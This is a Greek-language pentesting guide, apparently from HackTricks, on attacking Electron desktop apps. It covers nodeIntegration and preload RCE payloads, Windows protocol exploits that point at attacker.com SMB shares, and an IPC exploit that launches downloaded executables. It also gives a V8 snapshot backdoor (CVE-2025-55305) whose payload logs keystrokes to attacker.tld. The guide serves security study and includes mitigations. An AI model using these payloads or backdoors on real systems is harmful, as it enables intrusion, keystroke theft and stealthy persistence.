# Εφαρμογές Electron για Desktop

{{#include ../../../banners/hacktricks-training.md}}

## Εισαγωγή

Electron συνδυάζει ένα τοπικό backend (με **NodeJS**) και ένα frontend (**Chromium**), αν και του λείπουν κάποιοι μηχανισμοί ασφάλειας των σύγχρονων browsers.

Συνήθως μπορείς να βρεις τον κώδικα της εφαρμογής Electron μέσα σε ένα αρχείο `.asar`. Για να αποκτήσεις τον κώδικα πρέπει να τον εξαγάγεις:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Στον πηγαίο κώδικα μιας Electron app, μέσα στο `packet.json`, μπορείτε να βρείτε το `main.js` που έχει οριστεί και στο οποίο ορίζονται οι ρυθμίσεις ασφάλειας.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Το Electron έχει 2 τύπους διεργασιών:

- Main Process (έχει πλήρη πρόσβαση στο NodeJS)
- Renderer Process (θα πρέπει να έχει περιορισμένη πρόσβαση στο NodeJS για λόγους ασφαλείας)

![](<../../../images/image (182).png>)

Μια **renderer process** θα είναι ένα παράθυρο browser που φορτώνει ένα αρχείο:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Οι ρυθμίσεις της **renderer process** μπορούν να **διαμορφωθούν** στην **main process** μέσα στο αρχείο main.js. Ορισμένες από αυτές τις ρυθμίσεις θα **αποτρέψουν το Electron application από το να αποκτήσει RCE** ή άλλες ευπάθειες εάν οι **ρυθμίσεις είναι σωστά διαμορφωμένες**.

Η εφαρμογή Electron μπορεί να αποκτήσει πρόσβαση στη συσκευή μέσω Node apis, αν και μπορεί να ρυθμιστεί ώστε να το αποτρέψει:

- **`nodeIntegration`** - είναι `off` από προεπιλογή. Αν είναι `on`, επιτρέπει την πρόσβαση σε Node features από τη renderer process.
- **`contextIsolation`** - είναι `on` από προεπιλογή. Αν είναι `off`, οι main και renderer processes δεν είναι απομονωμένες.
- **`preload`** - είναι κενό από προεπιλογή.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - είναι `off` από προεπιλογή. Θα περιορίσει τις ενέργειες που μπορεί να εκτελέσει το NodeJS.
- Node Integration σε Workers
- **`nodeIntegrationInSubframes`**- είναι `off` από προεπιλογή.
- Αν το **`nodeIntegration`** είναι **enabled**, αυτό θα επέτρεπε τη χρήση των **Node.js APIs** σε web pages που είναι **φορτωμένες σε iframes** μέσα σε μια Electron application.
- Αν το **`nodeIntegration`** είναι **disabled**, τότε τα preloads θα φορτωθούν στο iframe

Παράδειγμα διαμόρφωσης:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Μερικά **RCE payloads** από [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Καταγραφή traffic

Τροποποιήστε τη διαμόρφωση start-main και προσθέστε τη χρήση ενός proxy όπως:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Αν μπορείτε να εκτελέσετε τοπικά μια Electron App, είναι πιθανό να καταφέρετε να την κάνετε να εκτελέσει αυθαίρετο javascript κώδικα. Δείτε πώς στο:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Αν το **nodeIntegration** είναι ρυθμισμένο σε **on**, το JavaScript μιας σελίδας web μπορεί να χρησιμοποιήσει λειτουργίες του Node.js εύκολα απλώς καλώντας τη `require()`. Για παράδειγμα, ο τρόπος εκτέλεσης της εφαρμογής calc στα Windows είναι:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Το script που υποδεικνύεται σε αυτή τη ρύθμιση είναι l**φορτωμένο πριν από άλλα scripts στον renderer**, έτσι έχει **απεριόριστη πρόσβαση σε Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Επομένως, το script μπορεί να εξάγει node-features σε σελίδες:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Αν το `contextIsolation` είναι ενεργοποιημένο, αυτό δεν θα δουλέψει**

## RCE: XSS + contextIsolation

Το _**contextIsolation**_ εισάγει τους **διαχωρισμένους contexts μεταξύ των scripts της web σελίδας και του internal JavaScript κώδικα του Electron** ώστε η εκτέλεση JavaScript του κάθε κομματιού κώδικα να μην επηρεάζει το άλλο. Πρόκειται για μια απαραίτητη λειτουργία για να εξαλειφθεί η πιθανότητα RCE.

Αν τα contexts δεν είναι απομονωμένα, ένας επιτιθέμενος μπορεί:

1. Εκτελέσει **arbitrary JavaScript in renderer** (XSS ή πλοήγηση σε εξωτερικές σελίδες)
2. **Αντικαταστήσει την built-in μέθοδο** που χρησιμοποιείται στο preload ή στον internal κώδικα του Electron για να αποκτήσει έλεγχο της συνάρτησης
3. **Προκαλέσει** τη χρήση της **αντικαταστημένης συνάρτησης**
4. RCE?

There are 2 places where built-int methods can be overwritten: In preload code or in Electron internal code:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Παράκαμψη click event

Αν υπάρχουν περιορισμοί όταν κάνετε click σε ένα link, ίσως να μπορείτε να τους παρακάμψετε **κάνoντας middle click** αντί για το κανονικό left click
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Για περισσότερες πληροφορίες σχετικά με αυτά τα παραδείγματα δείτε [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) και [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Κατά την ανάπτυξη μιας Electron desktop εφαρμογής, η διασφάλιση των σωστών ρυθμίσεων για `nodeIntegration` και `contextIsolation` είναι κρίσιμη. Έχει αποδειχθεί ότι **client-side remote code execution (RCE)** που στοχεύει preload scripts ή Electron's native code από τη main process αποτρέπεται αποτελεσματικά με αυτές τις ρυθμίσεις.

Όταν ένας χρήστης αλληλεπιδρά με links ή ανοίγει νέα παράθυρα, ενεργοποιούνται συγκεκριμένα event listeners, τα οποία είναι κρίσιμα για την ασφάλεια και τη λειτουργικότητα της εφαρμογής:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Αυτοί οι listeners είναι **υπερκαθορισμένοι από την επιτραπέζια εφαρμογή** για να υλοποιήσουν τη δική της **business logic**. Η εφαρμογή αξιολογεί εάν ένας πλοηγημένος σύνδεσμος πρέπει να ανοίξει εσωτερικά ή σε εξωτερικό web browser. Αυτή η απόφαση συνήθως λαμβάνεται μέσω μιας συνάρτησης, `openInternally`. Αν αυτή η συνάρτηση επιστρέψει `false`, σημαίνει ότι ο σύνδεσμος πρέπει να ανοίξει εξωτερικά, χρησιμοποιώντας τη συνάρτηση `shell.openExternal`.

**Εδώ είναι ένας απλοποιημένος ψευδοκώδικας:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Οι βέλτιστες πρακτικές ασφαλείας για το Electron JS συστήνουν να μην γίνεται αποδοχή μη αξιόπιστου περιεχομένου με τη συνάρτηση `openExternal`, καθώς αυτό μπορεί να οδηγήσει σε RCE μέσω διάφορων πρωτοκόλλων. Τα λειτουργικά συστήματα υποστηρίζουν διαφορετικά πρωτόκολλα που μπορεί να ενεργοποιήσουν RCE. Για αναλυτικά παραδείγματα και περαιτέρω εξήγηση πάνω σε αυτό το θέμα, μπορείτε να ανατρέξετε σε [αυτόν τον πόρο](https://positive.security/blog/url-open-rce#windows-10-19042), ο οποίος περιλαμβάνει παραδείγματα Windows protocol ικανά να εκμεταλλευτούν αυτή την ευπάθεια.

Στο macos, η συνάρτηση `openExternal` μπορεί να εκμεταλλευτεί για την εκτέλεση αυθαίρετων εντολών, π.χ. `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Παραδείγματα Windows protocol exploits περιλαμβάνουν:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Αυτή η vuln μπορεί να βρεθεί στο **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

Το **webviewTag** είναι μια **deprecated feature** που επιτρέπει τη χρήση του **NodeJS** στη **renderer process**, η οποία πρέπει να απενεργοποιηθεί καθώς επιτρέπει τη φόρτωση ενός script μέσα στο preload context όπως:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Επομένως, ένας επιτιθέμενος που καταφέρνει να φορτώσει μια αυθαίρετη σελίδα θα μπορούσε να χρησιμοποιήσει αυτό το tag για να **load an arbitrary preload script**.

Αυτό το preload script αξιοποιήθηκε στη συνέχεια για να καλέσει μια **vulnerable IPC service (`skype-new-window`)**, η οποία με τη σειρά της καλούσε **`shell.openExternal`** για να επιτύχει RCE:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Ανάγνωση Εσωτερικών Αρχείων: XSS + contextIsolation

**Απενεργοποίηση του `contextIsolation` επιτρέπει τη χρήση των `<webview>` tags**, παρόμοια με `<iframe>`, για ανάγνωση και exfiltrating τοπικών αρχείων. Ένα παράδειγμα δείχνει πώς να εκμεταλλευτείτε αυτή την ευπάθεια για να διαβάσετε το περιεχόμενο εσωτερικών αρχείων:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Επιπλέον, μοιράζεται μια άλλη μέθοδος για **ανάγνωση ενός εσωτερικού αρχείου**, επισημαίνοντας μια κρίσιμη ευπάθεια ανάγνωσης τοπικού αρχείου σε μια Electron desktop εφαρμογή. Αυτό περιλαμβάνει την εισαγωγή ενός script για να εκμεταλλευτεί την εφαρμογή και exfiltrate δεδομένα:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Old Chromium**

Εάν το **chromium** που χρησιμοποιείται από την εφαρμογή είναι **παλαιό** και υπάρχουν **γνωστές** **ευπάθειες** σε αυτό, μπορεί να είναι δυνατό να **εκμεταλλευτείτε** αυτές και να αποκτήσετε RCE μέσω XSS.\
Μπορείτε να δείτε ένα παράδειγμα σε αυτό το **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

Σε περίπτωση που βρήκατε XSS αλλά **δεν μπορείτε να ενεργοποιήσετε RCE ή να κλέψετε internal files** μπορείτε να προσπαθήσετε να το χρησιμοποιήσετε για να **steal credentials μέσω phishing**.

Πρώτα απ' όλα πρέπει να ξέρετε τι συμβαίνει όταν προσπαθείτε να ανοίξετε ένα νέο URL, ελέγχοντας τον JS κώδικα στο front-end:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Η κλήση στην **`openInternally`** θα αποφασίσει αν ο **link** θα **opened** στο **desktop window**, καθώς είναι ένα link που ανήκει στην πλατφόρμα, **or** αν θα ανοίξει στον **browser as a 3rd party resource**.

Σε περίπτωση που η **regex** που χρησιμοποιείται από τη συνάρτηση είναι **vulnerable to bypasses** (για παράδειγμα λόγω **not escaping the dots of subdomains**), ένας attacker θα μπορούσε να εκμεταλλευτεί το **XSS** για να **open a new window which** θα βρίσκεται στην υποδομή του attacker **asking for credentials** προς τον user:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Πρωτόκολλο

As mentioned in [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) σελίδες που τρέχουν στο **`file://`** έχουν μονομερή πρόσβαση σε κάθε αρχείο του συστήματός σας, πράγμα που σημαίνει ότι τα **XSS issues** μπορούν να χρησιμοποιηθούν για να φορτώσουν αυθαίρετα αρχεία από το μηχάνημα του χρήστη. Η χρήση ενός **προσαρμοσμένου πρωτοκόλλου** αποτρέπει τέτοια προβλήματα, καθώς μπορείτε να περιορίσετε το πρωτόκολλο ώστε να εξυπηρετεί μόνο ένα συγκεκριμένο σύνολο αρχείων.

## Remote module

The Electron Remote module επιτρέπει στις **renderer processes να έχουν πρόσβαση στα main process APIs**, διευκολύνοντας την επικοινωνία μέσα σε μια εφαρμογή Electron. Ωστόσο, η ενεργοποίηση αυτού του module εισάγει σημαντικούς κινδύνους ασφάλειας. Διευρύνει την attack surface της εφαρμογής, κάνοντάς την πιο επιρρεπή σε ευπάθειες όπως επιθέσεις cross-site scripting (XSS).

> [!TIP]
> Παρόλο που το **remote** module εκθέτει μερικά APIs από το main προς τα renderer processes, δεν είναι άμεσο να αποκτηθεί RCE απλώς εκμεταλλευόμενοι τα components. Ωστόσο, τα components μπορεί να εκθέτουν ευαίσθητες πληροφορίες.

> [!WARNING]
> Πολλές εφαρμογές που ακόμα χρησιμοποιούν το remote module το κάνουν με τρόπο που **απαιτεί το NodeIntegration να είναι ενεργοποιημένο** στη renderer process, το οποίο αποτελεί **τεράστιο κίνδυνο ασφαλείας**.

Από το Electron 14, το `remote` module μπορεί να είναι ενεργοποιημένο με διάφορους τρόπους· για λόγους ασφάλειας και απόδοσης, **συνιστάται να μην το χρησιμοποιείτε**.

Για να το ενεργοποιήσετε, πρώτα πρέπει να **το ενεργοποιήσετε στη main process**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Στη συνέχεια, η renderer process μπορεί να import objects από το module που θέλει:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
The **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** υποδεικνύει μερικές ενδιαφέρουσες **functions** που εκτίθενται από το αντικείμενο **`app`** του remote module:

- **`app.relaunch([options])`**
- **Επανεκκινεί** την εφαρμογή με το **κλείσιμο** της τρέχουσας παρουσίας και την **εκκίνηση** μίας νέας. Χρήσιμο για **ενημερώσεις της εφαρμογής** ή σημαντικές **αλλαγές κατάστασης**.
- **`app.setAppLogsPath([path])`**
- **Ορίζει** ή **δημιουργεί** έναν κατάλογο για την αποθήκευση των **αρχείων καταγραφής της εφαρμογής**. Τα καταγραφικά μπορούν να **ανακτηθούν** ή να **τροποποιηθούν** χρησιμοποιώντας τις **`app.getPath()`** ή **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Καταχωρεί** το τρέχον εκτελέσιμο ως **προεπιλεγμένο χειριστή** για ένα συγκεκριμένο **πρωτόκολλο**. Μπορείτε να παρέχετε μια **προσαρμοσμένη διαδρομή** και **παραμέτρους** αν χρειάζεται.
- **`app.setUserTasks(tasks)``**
- **Προσθέτει** εργασίες στην **Tasks category** στο **Jump List** (σε Windows). Κάθε task μπορεί να ελέγχει πώς η εφαρμογή **εκκινείται** ή ποιες **παράμετροι** περνιούνται.
- **`app.importCertificate(options, callback)`**
- **Εισάγει** ένα **PKCS#12 certificate** στην **αποθήκη πιστοποιητικών του συστήματος** (μόνο Linux). Ένα **callback** μπορεί να χρησιμοποιηθεί για να χειριστεί το αποτέλεσμα.
- **`app.moveToApplicationsFolder([options])`**
- **Μετακινεί** την εφαρμογή στον **Applications folder** (σε macOS). Βοηθά να διασφαλιστεί μια **τυπική εγκατάσταση** για χρήστες Mac.
- **`app.setJumpList(categories)`**
- **Ορίζει** ή **αφαιρεί** μια **προσαρμοσμένη Jump List** στα **Windows**. Μπορείτε να καθορίσετε **κατηγορίες** για να οργανώσετε πώς οι εργασίες εμφανίζονται στον χρήστη.
- **`app.setLoginItemSettings(settings)`**
- **Διαμορφώνει** ποια **εκτελέσιμα** εκκινούν κατά το **login** μαζί με τις **επιλογές** τους (μόνο macOS και Windows).

Example:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## μονάδα systemPreferences

Το **κύριο API** για την πρόσβαση στις ρυθμίσεις συστήματος και την **εκπομπή συμβάντων συστήματος** στο Electron. Μέθοδοι όπως **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, και **setUserDefault** είναι όλες **μέρος** αυτής της μονάδας.

**Παράδειγμα χρήσης:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Ακούει** για **native macOS notifications** χρησιμοποιώντας NSDistributedNotificationCenter.
* Πριν από **macOS Catalina**, μπορούσατε να sniff **όλες** τις distributed notifications περνώντας **nil** στο CFNotificationCenterAddObserver.
* Μετά το **Catalina / Big Sur**, sandboxed apps μπορούν ακόμα να **subscribe** σε **πολλά events** (π.χ. **κλείδωμα/ξεκλείδωμα οθόνης**, **mounts δίσκων**, **δραστηριότητα δικτύου**, κ.λπ.) καταχωρίζοντας notifications **με όνομα**.

### **getUserDefault / setUserDefault**

* **Επικοινωνεί** με **NSUserDefaults**, το οποίο αποθηκεύει **προτιμήσεις** εφαρμογής ή σε επίπεδο συστήματος στο macOS.

* Το **getUserDefault** μπορεί να **ανακτήσει** ευαίσθητες πληροφορίες, όπως **πρόσφατες τοποθεσίες αρχείων** ή **γεωγραφική θέση του χρήστη**.

* Το **setUserDefault** μπορεί να **τροποποιήσει** αυτές τις προτιμήσεις, ενδεχομένως επηρεάζοντας την **διαμόρφωση** μιας εφαρμογής.

* Σε **παλαιότερες εκδόσεις Electron** (πριν την v8.3.0), μόνο το **standard suite** του NSUserDefaults ήταν **προσβάσιμο**.

## Shell.showItemInFolder

Αυτή η συνάρτηση εμφανίζει το δοθέν αρχείο σε διαχειριστή αρχείων, ο οποίος **μπορεί να εκτελέσει αυτόματα το αρχείο**.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Οι εφαρμογές Electron θα πρέπει να έχουν μια **Content Security Policy (CSP)** για να **αποτρέπουν επιθέσεις XSS**. Το **CSP** είναι ένα **πρότυπο ασφάλειας** που βοηθά στην **αποτροπή** της **εκτέλεσης** **μη αξιόπιστου κώδικα** στον περιηγητή.

Συνήθως **διαμορφώνεται** στο αρχείο **`main.js`** ή στο template **`index.html`**, με την CSP μέσα σε **meta tag**.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) είναι ένα εργαλείο για την αναγνώριση λανθασμένων ρυθμίσεων και security anti-patterns σε εφαρμογές βασισμένες σε Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) είναι ένα open source VS Code plugin για εφαρμογές Electron που χρησιμοποιεί Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) για έλεγχο ευπαθών third-party βιβλιοθηκών
- [**Electro.ng**](https://electro.ng/): Πρέπει να το αγοράσετε

## Labs

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) μπορείτε να βρείτε ένα εργαστήριο για να εκμεταλλευτείτε ευπαθείς εφαρμογές Electron.

Μερικές εντολές που θα σας βοηθήσουν στο εργαστήριο:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Οι εφαρμογές βασισμένες σε Electron και Chromium deserialize ένα prebuilt V8 heap snapshot κατά την εκκίνηση (v8_context_snapshot.bin, and optionally browser_v8_context_snapshot.bin) για να αρχικοποιήσουν κάθε V8 isolate (main, preload, renderer). Ιστορικά, τα integrity fuses του Electron δεν αντιμετώπιζαν αυτά τα snapshots ως executable content, οπότε διέφευγαν τόσο το fuse-based integrity enforcement όσο και τα OS code-signing checks. Ως αποτέλεσμα, η αντικατάσταση του snapshot σε μια user-writable εγκατάσταση παρείχε stealthy, persistent code execution μέσα στην εφαρμογή χωρίς να τροποποιηθούν τα signed binaries ή το ASAR.

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation and OnlyLoadAppFromAsar validate app JavaScript inside the ASAR, αλλά δεν κάλυπταν τα V8 heap snapshots (CVE-2025-55305). Το Chromium παρομοίως δεν κάνει integrity-check στα snapshots.
- Attack preconditions: Local file write στο installation directory της εφαρμογής. Αυτό είναι κοινό σε συστήματα όπου Electron apps ή Chromium browsers είναι εγκατεστημένα κάτω από user-writable paths (π.χ. %AppData%\Local στα Windows; /Applications με caveats στο macOS).
- Effect: Reliable execution of attacker JavaScript σε οποιοδήποτε isolate με το clobbering ενός συχνά χρησιμοποιούμενου builtin (ένα “gadget”), επιτρέποντας persistence και evasion της code-signing verification.
- Affected surface: Electron apps (ακόμα και με fuses enabled) και Chromium-based browsers που φορτώνουν snapshots από user-writable locations.

Generating a malicious snapshot without building Chromium
- Χρησιμοποιήστε το prebuilt electron/mksnapshot για να compile ένα payload JS σε snapshot και να overwrite το application's v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (τρέξε διαφορετικό code στο main vs. renderer)
- Ανίχνευση main process: Node-only globals όπως process.pid, process.binding(), ή process.dlopen είναι παρόντα στο main process isolate.
- Ανίχνευση Browser/renderer: Browser-only globals όπως alert είναι διαθέσιμα όταν εκτελούνται σε document context.

Παράδειγμα gadget που probes τις main-process Node capabilities μία φορά
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-context PoC για κλοπή δεδομένων (π.χ., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Ροή εργασίας χειριστή
1) Γράψτε payload.js που αντικαθιστά ένα κοινό builtin (π.χ., Array.isArray) και προαιρετικά κάνει branching ανά isolate.
2) Build the snapshot without Chromium sources:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Overwrite the target application’s snapshot file(s):
- v8_context_snapshot.bin (always used)
- browser_v8_context_snapshot.bin (if the LoadBrowserProcessSpecificV8Snapshot fuse is used)
4) Launch the application; the gadget executes whenever the chosen builtin is used.

Σημειώσεις και παρατηρήσεις
- Bypass ακεραιότητας/υπογραφής: Τα snapshot αρχεία δεν θεωρούνται εγγενή εκτελέσιμα από τους ελέγχους code-signing και (ιστορικά) δεν καλύπτονταν από τα fuses του Electron ή τους μηχανισμούς integrity του Chromium.
- Persistence: Η αντικατάσταση του snapshot σε εγκατάσταση εγγράψιμη από τον χρήστη συνήθως επιβιώνει επανεκκινήσεις της εφαρμογής και μοιάζει με υπογεγραμμένη, νόμιμη εφαρμογή.
- Chromium browsers: Η ίδια έννοια παραποίησης εφαρμόζεται σε Chrome/derivatives που είναι εγκατεστημένα σε τοποθεσίες εγγράψιμες από τον χρήστη. Το Chrome έχει άλλα μέτρα ακεραιότητας αλλά ρητά εξαιρεί φυσικά τοπικές επιθέσεις από το threat model του.

Εντοπισμός και μετριασμοί
- Treat snapshots as executable content and include them in integrity enforcement (CVE-2025-55305 fix).
- Προτιμήστε τοποθεσίες εγκατάστασης που γράφονται μόνο από admin; καθορίστε baseline και παρακολουθείτε hashes για v8_context_snapshot.bin και browser_v8_context_snapshot.bin.
- Ανιχνεύστε early-runtime builtin clobbering και απροσδόκητες αλλαγές στα snapshot· ειδοποιήστε όταν οι deserialized snapshots δεν ταιριάζουν με τις αναμενόμενες τιμές.

## **Αναφορές**

- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)

